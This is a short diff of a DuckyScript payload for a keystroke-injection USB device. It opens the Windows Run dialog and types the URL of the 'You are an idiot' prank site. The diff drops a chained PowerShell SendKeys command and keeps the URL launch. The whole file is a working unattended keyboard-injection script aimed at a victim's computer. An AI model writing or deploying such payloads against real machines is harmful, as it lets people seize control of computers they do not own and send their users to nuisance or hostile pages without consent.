@@ -2,6 +2,6 @@ REM Author: her3ticAVI
 REM You are an idiot!
 GUI r
 DELAY 200
-STRING https://youareanidiot.cc && powershell.exe -Command "Add-Type -AssemblyName System.Windows.Forms; [System.Windows.Forms.SendKeys]::SendWait('{CLICK}')"
+STRING https://youareanidiot.cc
 DELAY 500
 ENTER
